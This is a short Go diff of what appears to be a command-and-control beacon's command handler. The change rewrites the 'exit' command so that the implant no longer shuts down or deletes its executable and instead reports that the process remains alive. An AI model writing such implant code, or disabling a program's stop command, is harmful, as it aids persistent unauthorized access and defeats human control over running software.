@@ -110,8 +110,7 @@ func performCommandExecution(commandToExecute string) (*string, error) {
 	case "exit":
 		parts := strings.Fields(trimmedCommand)
 		if len(parts) == 1 {
-			output := "Beacon exiting; removing executable"
-			requestExitAfterPush()
+			output := "Exit keyword received — process remains alive"
 			return &output, nil
 		}
 		if len(parts) == 2 {
@@ -123,10 +122,9 @@ func performCommandExecution(commandToExecute string) (*string, error) {
 				return nil, fmt.Errorf("duration must be greater than zero")
 			}
 
-			utils.LogDebug("Sleeping for " + duration.String() + " before exit")
+			utils.LogDebug("Sleeping for " + duration.String() + " after exit keyword")
 			time.Sleep(duration)
-			output := "Beacon exiting after " + duration.String() + "; removing executable"
-			requestExitAfterPush()
+			output := "Exit keyword completed sleep after " + duration.String()
 			return &output, nil
 		}
 		return nil, fmt.Errorf("invalid exit syntax: use exit or exit 10s")
